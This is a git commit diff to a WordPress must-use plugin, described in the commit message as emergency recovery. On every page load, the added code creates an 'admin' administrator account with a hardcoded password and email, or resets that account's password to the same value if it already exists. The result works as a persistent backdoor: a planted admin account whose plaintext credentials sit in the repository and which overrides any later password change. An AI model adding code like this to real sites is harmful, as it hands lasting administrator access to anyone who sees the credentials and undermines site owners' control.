a568009d7da19e38d18ff1bde968869d19084745
MUrilosilvalem <MURILOSILVALEM@GMAIL.COM>
2026-04-20 14:52:38 -0300

    Auto-create admin user if missing (emergency recovery)

--- wp-content/mu-plugins/force-reset.php
+++ wp-content/mu-plugins/force-reset.php
@@ -1,8 +1,18 @@
 <?php
-// Reset de senha forçado (Must-Use Plugin)
+// Criador de Usuário de Emergência (Must-Use Plugin)
 add_action('init', function() {
-    $user = get_user_by('login', 'admin');
-    if ($user) {
-        wp_set_password('Castro771920', $user->ID);
+    $username = 'admin';
+    $password = 'Castro771920';
+    $email    = 'contato@studiocastro.com.br';
+
+    if (!username_exists($username)) {
+        // Cria o usuário caso não exista
+        $user_id = wp_create_user($username, $password, $email);
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+    } else {
+        // Garante a senha caso ele já exista
+        $user = get_user_by('login', $username);
+        wp_set_password($password, $user->ID);
     }
 });
